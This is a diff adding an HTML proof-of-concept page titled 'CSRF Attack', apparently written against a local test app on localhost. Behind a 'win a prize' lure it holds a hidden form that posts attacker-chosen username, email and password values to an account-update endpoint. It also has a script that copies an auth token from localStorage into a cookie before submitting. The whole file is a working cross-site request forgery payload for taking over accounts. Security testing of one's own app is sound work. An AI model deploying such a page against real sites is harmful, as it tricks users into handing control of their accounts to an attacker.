@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CSRF Attack</title>
+</head>
+<body>
+  <h1>Click the button to win a prize!</h1>
+  <form id="prizeForm" action="http://localhost:5050/auth/update" method="POST">
+    <input type="hidden" name="username" value="HackedUser">
+    <input type="hidden" name="email" value="hengker@gmail.com">
+    <input type="hidden" name="password" value="youvebeenhackedlmao">
+    <button type="submit">Claim Your Prize</button>
+  </form>
+  <script>
+    document.getElementById('prizeForm').addEventListener('submit', function(event) {
+      event.preventDefault();
+      const token = localStorage.getItem('authToken');
+      if (token) {
+        document.cookie = `token=${token}; path=/`;
+      }
+      this.submit();
+    });
+  </script>
+</body>
+</html>
